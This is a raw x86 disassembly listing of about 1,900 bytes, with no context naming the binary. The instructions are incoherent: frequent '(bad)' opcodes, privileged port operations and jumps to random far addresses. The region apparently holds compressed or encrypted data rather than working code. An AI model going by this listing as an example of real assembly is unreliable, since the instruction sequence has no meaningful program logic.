  406a11:	or     bh,BYTE PTR [edx]
  406a13:	xor    BYTE PTR [ebx+edi*2+0x1a793af],dl
  406a1a:	fld    TBYTE PTR ss:[edx+0x49]
  406a1e:	je     0x4069ea
  406a20:	sub    BYTE PTR ds:0x1b346e8,bh
  406a26:	pop    ds
  406a27:	push   esi
  406a28:	mov    edi,DWORD PTR [esi+0x7d]
  406a2b:	jbe    0x4069db
  406a2d:	in     eax,dx
  406a2e:	hlt    
  406a2f:	and    esi,DWORD PTR [edx]
  406a31:	lods   al,BYTE PTR ds:[esi]
  406a32:	pop    eax
  406a33:	xchg   ebp,eax
  406a34:	outs   dx,DWORD PTR ds:[esi]
  406a35:	xor    al,0x96
  406a37:	or     al,0xa7
  406a39:	xchg   edx,eax
  406a3a:	or     DWORD PTR [esi+esi*2],ebp
  406a3d:	cli    
  406a3e:	imul   edi,DWORD PTR [ecx],0xffffff96
  406a41:	mov    esp,0xf0832ca3
  406a46:	inc    esp
  406a47:	sbb    al,0xbe
  406a49:	in     eax,dx
  406a4a:	outs   dx,BYTE PTR ds:[esi]
  406a4b:	dec    eax
  406a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a4d:	retf   
  406a4e:	(bad)  
  406a50:	call   0x1ecdbffa
  406a55:	xor    DWORD PTR [esi-0x28b41f2d],ebp
  406a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a5c:	rol    DWORD PTR [ecx+0x38],0x5a
  406a60:	or     BYTE PTR es:[esi+ebx*8-0x28],0x3f
  406a66:	xor    ch,al
  406a68:	jae    0x406a05
  406a6a:	xor    al,0x64
  406a6c:	(bad)  
  406a6e:	mov    dl,0xf
  406a70:	inc    edi
  406a71:	or     ebx,eax
  406a73:	fld    QWORD PTR [esi-0xb]
  406a76:	(bad)  
  406a77:	adc    al,0x2b
  406a79:	add    cl,BYTE PTR [edi-0x30]
  406a7c:	xchg   ebp,eax
  406a7d:	sbb    eax,0x1b6e13b5
  406a82:	les    edx,FWORD PTR [ebx*4-0x155765d8]
  406a89:	mov    bh,0x1b
  406a8b:	inc    DWORD PTR ds:0xea34244c
  406a91:	lea    ebx,[eax-0x79545dec]
  406a97:	sub    DWORD PTR [eax+0x7e3a7a45],ebx
  406a9d:	or     DWORD PTR [ebp+0x580a9da9],ebp
  406aa3:	sub    esp,DWORD PTR [ecx-0x19]
  406aa6:	repnz mov esi,DWORD PTR [edx+0x4f6fc1f7]
  406aad:	test   BYTE PTR [esi+0x1c],dl
  406ab0:	mov    bh,0xac
  406ab2:	mov    BYTE PTR [ecx-0x2b],al
  406ab5:	jns    0x406b1c
  406ab7:	push   edi
  406ab8:	sbb    al,0xe5
  406aba:	push   edx
  406abb:	pop    esi
  406abc:	inc    DWORD PTR [ecx-0x51853d98]
  406ac2:	dec    esp
  406ac3:	(bad)  
  406ac4:	mov    esp,0x2c33228c
  406ac9:	out    0x67,al
  406acb:	xor    bl,cl
  406acd:	dec    esp
  406ace:	pop    esp
  406acf:	ja     0x406b0f
  406ad1:	retf   0xde3b
  406ad4:	ins    BYTE PTR es:[edi],dx
  406ad5:	bound  esi,QWORD PTR [esi-0xf]
  406ad8:	xchg   ebx,eax
  406ad9:	shr    DWORD PTR [edx+esi*4],cl
  406adc:	outs   dx,DWORD PTR ds:[esi]
  406add:	lds    ecx,FWORD PTR [edi-0x17]
  406ae0:	jge    0x406a96
  406ae2:	pusha  
  406ae3:	addr16 pop ecx
  406ae5:	jne    0x406b2c
  406ae7:	xchg   esp,eax
  406ae8:	mov    ds:0x2a843b63,al
  406aed:	push   ds
  406aee:	xchg   esi,eax
  406aef:	mov    esp,0xb4ed25c9
  406af4:	and    edi,DWORD PTR [ebx]
  406af6:	and    DWORD PTR [edx],eax
  406af8:	std    
  406af9:	inc    esp
  406afa:	inc    eax
  406afb:	push   0x20
  406afd:	jbe    0x406a82
  406aff:	fdiv   QWORD PTR cs:[esi]
  406b02:	xchg   esp,eax
  406b03:	mov    dh,0x99
  406b05:	add    DWORD PTR [ebx+0x32887b4c],ebp
  406b0b:	push   ebx
  406b0c:	sbb    cl,BYTE PTR ds:0xe4a9858e
  406b12:	and    ecx,0xffffffec
  406b15:	dec    eax
  406b16:	gs stos DWORD PTR es:[edi],eax
  406b18:	jno    0x406ade
  406b1a:	call   0x303e:0x28efd173
  406b21:	xchg   edx,eax
  406b22:	inc    ebx
  406b23:	test   al,0x98
  406b25:	ficomp WORD PTR [esi-0x7534c101]
  406b2b:	sahf   
  406b2c:	cwde   
  406b2d:	mov    esi,0x797bb36e
  406b32:	ss xchg ebp,eax
  406b34:	adc    al,0xd3
  406b36:	pop    eax
  406b37:	mov    al,ds:0x21d9e357
  406b3c:	xor    DWORD PTR [eax-0x3d0bcb83],esp
  406b42:	xlat   BYTE PTR ds:[ebx]
  406b43:	pop    ebp
  406b44:	ret    
  406b45:	dec    ebp
  406b46:	push   cs
  406b47:	jecxz  0x406acb
  406b49:	and    BYTE PTR [ebp*8-0xd270999],bl
  406b50:	leave  
  406b51:	test   eax,0xf9b09e06
  406b56:	add    DWORD PTR [edx+esi*4],esp
  406b59:	pop    ds
  406b5a:	mov    bl,0xab
  406b5c:	inc    esi
  406b5d:	pop    ebx
  406b5e:	in     eax,0xa2
  406b60:	(bad)  
  406b61:	aam    0x74
  406b63:	add    al,0x1d
  406b65:	rcr    DWORD PTR [esi+0x38121541],1
  406b6b:	fsubr  st,st(1)
  406b6d:	out    0x44,eax
  406b6f:	or     edi,esi
  406b71:	adc    al,0xb2
  406b73:	ins    DWORD PTR es:[edi],dx
  406b74:	mov    dl,0x12
  406b76:	ret    0xbb8a
  406b79:	xchg   edx,eax
  406b7a:	out    0xee,al
  406b7c:	sub    al,BYTE PTR [ebx+ebx*8+0x760e21c6]
  406b83:	aad    0x3e
  406b85:	push   ds
  406b86:	(bad)  
  406b87:	jmp    0xda9a:0xdcb4a23
  406b8e:	dec    eax
  406b8f:	loopne 0x406bc2
  406b91:	data16 xlat BYTE PTR ds:[ebx]
  406b93:	imul   ebp,DWORD PTR [ecx],0xd1f45f2b
  406b99:	sti    
  406b9a:	push   edi
  406b9b:	mov    dh,0xae
  406b9d:	push   cs
  406b9e:	and    al,0x90
  406ba0:	cmp    al,0x20
  406ba2:	outs   dx,DWORD PTR ds:[esi]
  406ba3:	mov    eax,ds:0xc0e595dd
  406ba8:	sbb    edx,DWORD PTR [ebp-0x41bf1216]
  406bae:	mov    ebx,fs
  406bb0:	sub    edx,edx
  406bb2:	repnz pop edi
  406bb4:	das    
  406bb5:	lock or BYTE PTR [edi],0xab
  406bb9:	ins    BYTE PTR es:[edi],dx
  406bba:	sbb    eax,0x5e45be85
  406bbf:	clc    
  406bc0:	xor    bl,BYTE PTR [ecx-0x65]
  406bc3:	inc    edx
  406bc4:	cld    
  406bc5:	pop    esp
  406bc6:	mov    gs,WORD PTR [ecx+ebp*1]
  406bc9:	enter  0xf02f,0x67
  406bcd:	into   
  406bce:	je     0x406b52
  406bd0:	rcr    DWORD PTR [edx+0x67c43566],1
  406bd6:	leave  
  406bd7:	add    ch,BYTE PTR [ebx]
  406bd9:	lods   eax,DWORD PTR ds:[esi]
  406bda:	xchg   esi,eax
  406bdb:	xor    BYTE PTR ss:[ebx+0x64b97c7b],bl
  406be2:	dec    ebx
  406be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be4:	arpl   WORD PTR [edx+ebp*8],di
  406be7:	mul    BYTE PTR [ebx+0x1e9af30b]
  406bed:	jmp    0xb3ed1071
  406bf2:	out    dx,eax
  406bf3:	inc    DWORD PTR [esp+edi*4+0x54d6441f]
  406bfa:	jg     0x406c5f
  406bfc:	loop   0x406c5c
  406bfe:	sbb    ebx,eax
  406c00:	push   0x5e
  406c02:	sbb    eax,0xf1530dfc
  406c07:	shr    DWORD PTR [edx+ebp*2],0x48
  406c0b:	lds    edi,FWORD PTR [ecx]
  406c0d:	dec    ebp
  406c0e:	xchg   ebx,eax
  406c0f:	popa   
  406c10:	dec    eax
  406c11:	fisttp WORD PTR [ecx+eiz*2-0x7ead64d4]
  406c18:	jns    0x406be5
  406c1a:	or     DWORD PTR [eax+0x4051ab77],eax
  406c20:	xor    al,0xfe
  406c22:	hlt    
  406c23:	loopne 0x406c53
  406c25:	mov    WORD PTR [esi+0x28],fs
  406c28:	les    ecx,FWORD PTR [ecx-0x27]
  406c2b:	into   
  406c2c:	inc    eax
  406c2d:	inc    ecx
  406c2e:	sub    bh,al
  406c30:	add    eax,DWORD PTR [ecx+0xe]
  406c33:	cmp    eax,0x1ea633a9
  406c38:	repz inc si
  406c3b:	inc    edi
  406c3c:	mov    ss,WORD PTR [ecx+0x2e]
  406c3f:	xchg   esp,eax
  406c40:	outs   dx,BYTE PTR ds:[esi]
  406c41:	dec    ebx
  406c42:	ins    BYTE PTR es:[edi],dx
  406c43:	pop    ecx
  406c44:	jmp    0x406cb1
  406c46:	push   edx
  406c47:	jp     0x406bd4
  406c49:	jp     0x406cb8
  406c4b:	sbb    bh,BYTE PTR [eax-0x26d76294]
  406c51:	jb     0x406c2a
  406c53:	fs push ebp
  406c55:	shl    bl,0x78
  406c58:	and    ebp,DWORD PTR [ebp+0x770d221f]
  406c5e:	adc    ecx,edx
  406c60:	mov    edi,DWORD PTR [edi]
  406c62:	mov    ss,WORD PTR cs:[eax+edx*1+0x8d15d22]
  406c6a:	call   0xabb48587
  406c6f:	arpl   WORD PTR [ebp-0x6ba110d4],cx
  406c75:	daa    
  406c76:	retf   
  406c77:	icebp  
  406c78:	pushf  
  406c79:	sar    DWORD PTR [ebx+0x15],0x2b
  406c7d:	iret   
  406c7e:	les    esi,FWORD PTR [eax]
  406c80:	mov    bl,ah
  406c82:	(bad)  
  406c83:	sti    
  406c84:	jl     0x406c7a
  406c86:	inc    edi
  406c87:	cmp    BYTE PTR [eax-0x59],bl
  406c8a:	std    
  406c8b:	pop    ecx
  406c8c:	ds jg  0x406cae
  406c8f:	pop    ebp
  406c90:	aas    
  406c91:	mov    bh,0x37
  406c93:	sbb    dl,0xd1
  406c96:	add    bh,BYTE PTR [edx-0x72]
  406c99:	stos   BYTE PTR es:[edi],al
  406c9a:	or     BYTE PTR ds:0x27be218f,ch
  406ca0:	inc    ecx
  406ca1:	cdq    
  406ca2:	adc    edx,ebx
  406ca4:	mov    al,ds:0x681b6c5d
  406ca9:	out    0x5a,eax
  406cab:	ins    BYTE PTR es:[edi],dx
  406cac:	cmp    eax,0xf6d03f1a
  406cb1:	sub    cl,0x1
  406cb4:	shl    DWORD PTR [ebx+0xa],cl
  406cb7:	mov    edx,ebp
  406cb9:	aad    0x90
  406cbb:	push   ss
  406cbc:	mov    WORD PTR [ecx-0x3a],?
  406cbf:	cmp    eax,0xfe243b51
  406cc4:	data16 sub al,0x24
  406cc7:	leave  
  406cc8:	mov    al,ds:0x2eeabc97
  406ccd:	dec    eax
  406cce:	jbe    0x406ca1
  406cd0:	sub    al,0x16
  406cd2:	add    bl,BYTE PTR [eax]
  406cd4:	mov    ah,0xcb
  406cd6:	sub    edx,DWORD PTR [ecx-0x788c1d17]
  406cdc:	js     0x406d31
  406cde:	cli    
  406cdf:	cmp    al,0xd2
  406ce1:	push   ebp
  406ce2:	sbb    bh,BYTE PTR [edi]
  406ce4:	jmp    0x406d41
  406ce6:	fiadd  WORD PTR [ebx+0x4d5bb79e]
  406cec:	mov    eax,0x23c96d92
  406cf1:	aad    0x63
  406cf3:	(bad)
  406cf6:	sbb    DWORD PTR fs:[ebx-0x28c4445e],esi
  406cfd:	sbb    DWORD PTR [eax+0x50],edi
  406d00:	aas    
  406d01:	jmp    0xb7b6:0x6ed8ac39
  406d08:	pop    eax
  406d09:	xor    al,0x59
  406d0b:	adc    dh,BYTE PTR [eax+0x6647576c]
  406d11:	add    DWORD PTR [esi+edx*1-0x73],0x23de9081
  406d19:	aam    0x6b
  406d1b:	enter  0x564b,0xa9
  406d1f:	pop    ebx
  406d20:	cmovl  ebx,ecx
  406d23:	inc    ebx
  406d24:	and    dl,al
  406d26:	sbb    eax,0x7b944d9
  406d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d2c:	mov    esi,0x454bb54
  406d31:	clc    
  406d32:	js     0x406d0b
  406d34:	js     0x406cbc
  406d36:	add    BYTE PTR [ebx+0x2a],bh
  406d39:	add    al,BYTE PTR [edx]
  406d3b:	sti    
  406d3c:	pop    esi
  406d3d:	cmp    DWORD PTR [ecx+0x65],ebp
  406d40:	adc    bh,BYTE PTR [eax+0x2e4a51b1]
  406d46:	add    ebp,DWORD PTR [edi+0x45f30776]
  406d4c:	or     al,0x3d
  406d4e:	xlat   BYTE PTR ds:[ebx]
  406d4f:	scas   eax,DWORD PTR es:[edi]
  406d50:	mov    esp,0x33fa549b
  406d55:	fimul  WORD PTR [ebx-0x26]
  406d58:	mov    cl,0x90
  406d5a:	ret    
  406d5b:	into   
  406d5c:	cwde   
  406d5d:	fs mov cl,0xc6
  406d60:	test   BYTE PTR [esi],bl
  406d62:	jg     0x406d7b
  406d64:	mov    ah,0xe5
  406d66:	jnp    0x406dbc
  406d68:	gs into 
  406d6a:	mov    esp,0xed8d8749
  406d6f:	jmp    0xbd66be40
  406d74:	mov    dh,0xb4
  406d76:	in     eax,0xb3
  406d78:	mov    edx,0xd00fab2a
  406d7d:	(bad)  
  406d7e:	mov    eax,ds:0x51b5db75
  406d83:	fcomp  QWORD PTR [eax+0x3d08aba5]
  406d89:	adc    DWORD PTR [eax-0x51],0xfffffff0
  406d8d:	xor    DWORD PTR ds:[ebx-0x4eb92086],esi
  406d94:	sti    
  406d95:	xchg   edi,eax
  406d96:	fmul   DWORD PTR [ebx]
  406d98:	dec    edi
  406d99:	push   ss
  406d9a:	sub    BYTE PTR [ecx+0x32],ah
  406d9d:	data16 adc cl,al
  406da0:	fisub  DWORD PTR [esi-0x1]
  406da3:	sub    ecx,DWORD PTR [ecx]
  406da5:	jmp    0xd62256ff
  406daa:	fs inc esp
  406dac:	inc    esp
  406dad:	sub    esp,DWORD PTR [esi]
  406daf:	cmp    eax,0x2258d0fb
  406db4:	out    dx,al
  406db5:	and    BYTE PTR [ecx-0x5e],0x9e
  406db9:	mov    eax,ds:0x5882e1d1
  406dbe:	or     al,0x23
  406dc0:	scas   al,BYTE PTR es:[edi]
  406dc1:	outs   dx,DWORD PTR ds:[esi]
  406dc2:	jle    0x406de1
  406dc4:	cld    
  406dc5:	loopne 0x406dd4
  406dc7:	test   DWORD PTR [edx-0x8],esi
  406dca:	cmp    BYTE PTR [ebx],dh
  406dcc:	pop    esp
  406dcd:	inc    ebx
  406dce:	mov    edi,0xcd3aa822
  406dd3:	pushf  
  406dd4:	jno    0x406e2f
  406dd6:	and    ecx,DWORD PTR [edx]
  406dd8:	dec    ebx
  406dd9:	fxch   st(4)
  406ddb:	sub    al,BYTE PTR [ecx]
  406ddd:	inc    ebx
  406dde:	add    ch,ch
  406de0:	ds xor eax,0x8db59103
  406de6:	popa   
  406de7:	(bad)  
  406de8:	call   0x6fab616d
  406ded:	pop    edi
  406dee:	outs   dx,DWORD PTR ds:[esi]
  406def:	imul   esp,DWORD PTR ds:0xf06e8c5,0x9bd94802
  406df9:	test   eax,0xe328f1b4
  406dfe:	fmul   QWORD PTR cs:[esi]
  406e01:	scas   eax,DWORD PTR es:[edi]
  406e02:	in     al,0x56
  406e04:	ret    
  406e05:	pop    edi
  406e06:	and    ch,BYTE PTR ds:0xc39fde33
  406e0c:	enter  0xa18f,0xe6
  406e10:	mov    dl,0x33
  406e12:	les    esi,FWORD PTR [edx-0x342ed064]
  406e18:	xchg   edi,eax
  406e19:	ficom  WORD PTR [edi]
  406e1b:	inc    esi
  406e1c:	aad    0x3e
  406e1e:	cmp    eax,0x3e09d474
  406e23:	(bad)  
  406e24:	stos   DWORD PTR es:[edi],eax
  406e25:	pop    ecx
  406e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e27:	sbb    BYTE PTR [esi-0x52],cl
  406e2a:	sub    eax,DWORD PTR [edi+0x11d9d0bc]
  406e30:	xchg   edi,eax
  406e31:	ins    DWORD PTR es:[edi],dx
  406e32:	adc    ebp,ebx
  406e34:	fstp   TBYTE PTR [esp+eiz*4-0x6b]
  406e38:	sbb    eax,0xc893889e
  406e3d:	into   
  406e3e:	sar    BYTE PTR [eax-0x1cbd5acc],0x49
  406e45:	lds    esp,FWORD PTR [ebx+eiz*2+0x79]
  406e49:	ret    
  406e4a:	fwait
  406e4b:	lods   al,BYTE PTR ds:[esi]
  406e4c:	dec    esi
  406e4d:	jl     0x406e13
  406e4f:	or     DWORD PTR [eax+0x786cdb68],esi
  406e55:	sar    edx,cl
  406e57:	ror    DWORD PTR [edx-0x1db6a943],cl
  406e5d:	lods   al,BYTE PTR ds:[esi]
  406e5e:	mov    ecx,0x4b9fb115
  406e63:	and    eax,DWORD PTR [ecx]
  406e65:	out    0x4b,eax
  406e67:	imul   ebx,DWORD PTR [ecx],0x2d
  406e6a:	repz pusha 
  406e6c:	aas    
  406e6d:	cmp    eax,0xf54a7aee
  406e72:	push   cs
  406e73:	stos   DWORD PTR es:[edi],eax
  406e74:	dec    BYTE PTR [esi+0x2]
  406e77:	cmp    dl,dh
  406e79:	adc    ch,bh
  406e7b:	sub    eax,0xf509ab2c
  406e80:	loope  0x406ec1
  406e82:	scas   al,BYTE PTR es:[edi]
  406e83:	fistp  DWORD PTR [ebp-0x43709e8e]
  406e89:	pop    ebx
  406e8a:	push   ss
  406e8b:	mov    ds:0xa4224638,eax
  406e90:	cmp    bh,ah
  406e92:	nop
  406e93:	stos   DWORD PTR es:[edi],eax
  406e94:	cwde   
  406e95:	std    
  406e96:	stos   BYTE PTR es:[edi],al
  406e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e98:	jge    0x406ee6
  406e9a:	rep stos DWORD PTR es:[edi],eax
  406e9c:	sahf   
  406e9d:	clc    
  406e9e:	jge    0x406e36
  406ea0:	dec    edi
  406ea1:	cmp    BYTE PTR [ecx+0x19],ah
  406ea4:	dec    esp
  406ea5:	dec    esp
  406ea6:	shr    DWORD PTR [edi],1
  406ea8:	push   cs
  406ea9:	sub    bh,BYTE PTR [eax-0x7b]
  406eac:	mov    al,bh
  406eae:	mov    dl,0xfe
  406eb0:	imul   edx,DWORD PTR ds:0x1999553a,0x69
  406eb7:	add    BYTE PTR [edi+0x2e],bh
  406eba:	mov    eax,edi
  406ebc:	sub    eax,0x9a218ed9
  406ec1:	cli    
  406ec2:	and    bl,BYTE PTR [ebx+ebx*4]
  406ec5:	add    eax,DWORD PTR [ebp-0x4b5c30ad]
  406ecb:	mov    ds:0xa20a70f5,al
  406ed0:	mov    ch,0x33
  406ed2:	cmp    DWORD PTR [ebx+0x6b426777],esi
  406ed8:	and    eax,DWORD PTR [edx-0x8b1133b]
  406ede:	push   esp
  406edf:	push   es
  406ee0:	add    ebp,DWORD PTR [esi+0x9304ee5]
  406ee6:	(bad)  
  406ee7:	sub    al,0x4b
  406ee9:	inc    ebp
  406eea:	sbb    ch,BYTE PTR [eax+0x27]
  406eed:	std    
  406eee:	mov    al,0xbe
  406ef0:	aas    
  406ef1:	arpl   WORD PTR [eax-0x38401db2],bx
  406ef7:	mov    esi,ebx
  406ef9:	jnp    0x406e85
  406efb:	call   DWORD PTR [eax+0x5f]
  406efe:	pop    ecx
  406eff:	loopne 0x406eae
  406f01:	imul   ecx,eax,0x40
  406f04:	imul   ebx,DWORD PTR [ecx+0xd6c9332],0xffffffb6
  406f0b:	jp     0x406f6c
  406f0d:	fimul  DWORD PTR ss:[edi]
  406f10:	retf   
  406f11:	cdq    
  406f12:	mov    ah,0x35
  406f14:	arpl   WORD PTR [edi-0x78],bx
  406f17:	xor    BYTE PTR [ebp+ebx*2+0x5e],dl
  406f1b:	or     DWORD PTR [edi],0x5e
  406f1e:	aaa    
  406f1f:	cdq    
  406f20:	xchg   ebp,eax
  406f21:	mov    al,0xd6
  406f23:	add    al,0x3e
  406f25:	nop
  406f26:	xrelease mov DWORD PTR [esi-0x58089c07],eax
  406f2d:	shl    ah,1
  406f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f30:	push   ebp
  406f31:	(bad)  
  406f32:	jns    0x406f55
  406f34:	rcr    BYTE PTR [ecx-0x2],cl
  406f37:	add    BYTE PTR [edx+0x10],0x41
  406f3b:	mov    ebp,0x43deb24c
  406f40:	aam    0x3e
  406f42:	mov    cl,BYTE PTR [ecx-0x42c03a83]
  406f48:	neg    BYTE PTR [ecx-0x6f]
  406f4b:	xor    al,0x89
  406f4d:	xor    bl,cl
  406f4f:	div    DWORD PTR [esi+0x2dc56df1]
  406f55:	push   ds
  406f56:	mov    ch,0xf0
  406f58:	push   cs
  406f59:	(bad)  
  406f5a:	stc    
  406f5b:	push   esi
  406f5c:	les    esp,FWORD PTR [bp-0x7b]
  406f60:	ret    
  406f61:	mov    dh,0xb4
  406f63:	mov    ds:0xf27c920,eax
  406f68:	push   edx
  406f69:	loope  0x406fa0
  406f6b:	and    al,0x18
  406f6d:	jae    0x406f2b
  406f6f:	jge    0x406fe5
  406f71:	pop    edx
  406f72:	icebp  
  406f73:	and    DWORD PTR [edi+0x69],ecx
  406f76:	lds    edi,FWORD PTR [eax+ecx*2-0x1f]
  406f7a:	pop    ss
  406f7b:	aad    0x90
  406f7d:	xor    al,0x5f
  406f7f:	pushf  
  406f80:	dec    ebx
  406f81:	dec    esp
  406f82:	loop   0x406f82
  406f84:	mov    dl,0x6f
  406f86:	jns    0x406fae
  406f88:	jno    0x406fc2
  406f8a:	fsub   QWORD PTR [ebx+0x4de7af7]
  406f90:	add    eax,0xdb2997c6
  406f95:	dec    ebp
  406f96:	sub    al,0xf9
  406f98:	xchg   edx,eax
  406f99:	inc    ebx
  406f9a:	in     al,0x33
  406f9c:	adc    DWORD PTR [eax+0x11],esi
  406f9f:	adc    edi,ebp
  406fa1:	fld    TBYTE PTR [edi]
  406fa3:	pop    ss
  406fa4:	aad    0xe0
  406fa6:	pop    ds
  406fa7:	cmp    al,0xe6
  406fa9:	loopne 0x406f33
  406fab:	mov    bh,0x19
  406fad:	jno    0x406f54
  406faf:	inc    esi
  406fb0:	xlat   BYTE PTR ds:[ebx]
  406fb1:	cmp    BYTE PTR [eax*1-0x4e893711],cl
  406fb8:	cmp    BYTE PTR [edi],0xd0
  406fbb:	sar    DWORD PTR [edx],1
  406fbd:	ret    
  406fbe:	(bad)  
  406fbf:	jmp    0x47ef:0xd2aca0f0
  406fc6:	push   esp
  406fc7:	je     0x406fbd
  406fc9:	iret   
  406fca:	lahf   
  406fcb:	les    esp,FWORD PTR [ebx]
  406fcd:	or     dh,BYTE PTR [esi+0x6c]
  406fd0:	fcomp  DWORD PTR [eax]
  406fd2:	mov    ds:0x977abc1a,al
  406fd7:	xor    eax,0x6ad3716
  406fdc:	inc    edx
  406fdd:	add    eax,0xd2986e4f
  406fe2:	clc    
  406fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fe4:	mov    DWORD PTR [ecx+0x1fa73ed3],edi
  406fea:	js     0x40700d
  406fec:	mov    dh,0xd3
  406fee:	xor    eax,0x358c29a8
  406ff3:	inc    ebx
  406ff4:	jne    0x40700f
  406ff6:	add    ebp,DWORD PTR [esi+ebx*8]
  406ff9:	loope  0x406fc5
  406ffb:	pop    esp
  406ffc:	fldenv [edx+0x3c832f86]
  407002:	cmp    DWORD PTR ds:0x4ae03d71,esp
  407008:	dec    esi
  407009:	fwait
  40700a:	les    ecx,FWORD PTR [ebx-0xc]
  40700d:	scas   al,BYTE PTR es:[edi]
  40700e:	(bad)  
  40700f:	jmp    0x4cc2:0x9ad7d412
  407016:	in     al,dx
  407017:	or     ebp,esi
  407019:	dec    ebx
  40701a:	mov    ebx,0xfffd2f4
  40701f:	mov    al,0x6a
  407021:	imul   ecx,DWORD PTR [edx-0x49d64941],0xea1416b9
  40702b:	jo     0x407076
  40702d:	cmc    
  40702e:	dec    edx
  40702f:	jno    0x4070a7
  407031:	mov    ebp,0x839e21df
  407036:	in     eax,dx
  407037:	add    dl,bh
  407039:	inc    esp
  40703a:	in     al,dx
  40703b:	sub    eax,0xfd221671
  407040:	pop    ds
  407041:	add    DWORD PTR [edi+edx*4+0x2e],esp
  407045:	loope  0x406fc7
  407047:	(bad)  
  407048:	sbb    DWORD PTR [edi],edi
  40704a:	call   0x86d18b15
  40704f:	push   0x28
  407051:	pop    eax
  407052:	fs xchg edx,eax
  407054:	scas   eax,DWORD PTR es:[edi]
  407055:	call   0xcb5a:0xa1a5100f
  40705c:	enter  0xa7b3,0xe0
  407060:	mov    BYTE PTR [eax-0x3fe07ba4],dh
  407066:	into   
  407067:	mov    ebp,0xb11763fc
  40706c:	js     0x4070d8
  40706e:	inc    edi
  40706f:	stc    
  407070:	mov    WORD PTR [ebx+0xbf42854],es
  407076:	cwde   
  407077:	scas   eax,DWORD PTR es:[edi]
  407078:	sbb    al,0x1a
  40707a:	stos   BYTE PTR es:[edi],al
  40707b:	jns    0x407071
  40707d:	ss jbe 0x40702d
  407080:	(bad)  
  407081:	in     al,0xec
  407083:	pop    ecx
  407084:	mov    eax,ds:0x261dd472
  407089:	cmp    eax,0xf5667552
  40708e:	daa    
  40708f:	pop    eax
  407090:	outs   dx,BYTE PTR ds:[esi]
  407091:	pop    ecx
  407092:	cdq    
  407093:	xchg   ecx,eax
  407094:	cmp    al,0x2e
  407096:	dec    edi
  407097:	sbb    BYTE PTR [edi-0x4778420a],0xd7
  40709e:	scas   eax,DWORD PTR es:[edi]
  40709f:	push   ebp
  4070a0:	enter  0xdba2,0xbe
  4070a4:	rcl    DWORD PTR [esi],cl
  4070a6:	mov    al,BYTE PTR [ecx-0x7]
  4070a9:	ins    DWORD PTR es:[edi],dx
  4070aa:	mov    edi,0x43d576e4
  4070af:	arpl   WORD PTR [edi+0x5075e14e],ax
  4070b5:	lock xor BYTE PTR fs:[ebp-0x2],dl
  4070ba:	or     ebx,DWORD PTR [ecx+edi*2-0x56fb4ab7]
  4070c1:	into   
  4070c2:	and    al,0xae
  4070c4:	xor    eax,0xd454ec7e
  4070c9:	iret   
  4070ca:	push   ds
  4070cb:	xor    al,BYTE PTR [edi+ebx*2]
  4070ce:	inc    esi
  4070cf:	dec    esi
  4070d0:	adc    DWORD PTR [ebp*1+0x7b656a87],ebx
  4070d7:	fdiv   st(7),st
  4070d9:	outs   dx,BYTE PTR ds:[esi]
  4070da:	jmp    0xc392ec1
  4070df:	(bad)  
  4070e0:	(bad)  [edi+0x5e21d2c0]
  4070e6:	test   al,0x2
  4070e8:	in     al,dx
  4070e9:	out    0x1d,eax
  4070eb:	pop    ebx
  4070ec:	gs into 
  4070ee:	pop    ebx
  4070ef:	and    DWORD PTR [eax+0x29],0xb9a5ddad
  4070f6:	div    DWORD PTR [ecx]
  4070f8:	ds mov al,0x81
  4070fb:	mov    edi,0x7110991c
  407100:	bound  esi,QWORD PTR [ecx+0x16]
  407103:	add    dl,dh
  407105:	mov    esi,0x4fe70a6c
  40710a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40710b:	fsin   
  40710d:	out    0xa8,al
  40710f:	repnz cmp ah,dh
  407112:	cmp    BYTE PTR [edx-0x74193aef],0xbf
  407119:	test   eax,0xb9e26a19
  40711e:	push   esp
  40711f:	mov    esi,DWORD PTR [eax+eiz*8]
  407122:	out    dx,al
  407123:	mov    esi,0x6015f2d6
  407128:	idiv   DWORD PTR ds:0xf142b368
  40712e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407130:	imul   BYTE PTR [ebx+0x194349fb]
  407136:	jmp    0xcd0a7418
  40713b:	sub    BYTE PTR [eax+0xfe15206],cl
  407141:	pop    ebp
  407142:	int    0xc7
  407144:	leave  
  407145:	hlt    
  407146:	div    DWORD PTR [ebp+0x5d]
  407149:	and    eax,0x6830bf50
  40714e:	and    DWORD PTR ds:0x5b34ac6c,edi
  407154:	inc    esi
  407155:	mov    cl,0xe7
  407157:	pop    eax
  407158:	int3   
  407159:	test   BYTE PTR [edx-0x64],ch
  40715c:	test   BYTE PTR [eax-0x34bf008a],bh
  407162:	call   0x254c4b51
  407167:	ja     0x4071c5
  407169:	mov    esp,0xeac507f
  40716e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40716f:	and    BYTE PTR [eax+0x1fbb355c],dl
  407175:	adc    esi,DWORD PTR [ecx+0x27b50a3d]
  40717b:	xchg   esi,eax
  40717c:	fsubr  QWORD PTR [ebx]
  40717e:	dec    ebp
  40717f:	jmp    0x69df:0xa688ca6c
  407186:	rcr    ch,cl
  407188:	cmp    al,0xdb
  40718a:	dec    ebp
  40718b:	and    bh,BYTE PTR [edx+esi*1+0x10]
  40718f:	ret    
  407190:	and    al,0x90
  407192:	dec    esi
  407193:	jl     0x40719e
  407195:	inc    ebp
  407196:	mov    esi,0xcbddb060
  40719b:	sbb    edi,DWORD PTR [esi+0x2]
  40719e:	jb     0x4071a2
  4071a0:	adc    bl,BYTE PTR [si]
  4071a3:	mov    WORD PTR [eax-0x5d8ce851],es
  4071a9:	in     eax,dx
  4071aa:	rol    BYTE PTR [edx],cl
  4071ac:	stos   DWORD PTR es:[edi],eax
  4071ad:	mov    ecx,0x90feff20
  4071b2:	or     BYTE PTR [ebx+0x2b555a03],ah
  4071b8:	sub    al,0xc3
  4071ba:	ds (bad) 
  4071bc:	cmp    al,0xf2
  4071be:	cmc    
  4071bf:	cwde   
  4071c0:	xor    DWORD PTR [edx],edx
  4071c2:	(bad)  
  4071c3:	sub    al,0xda
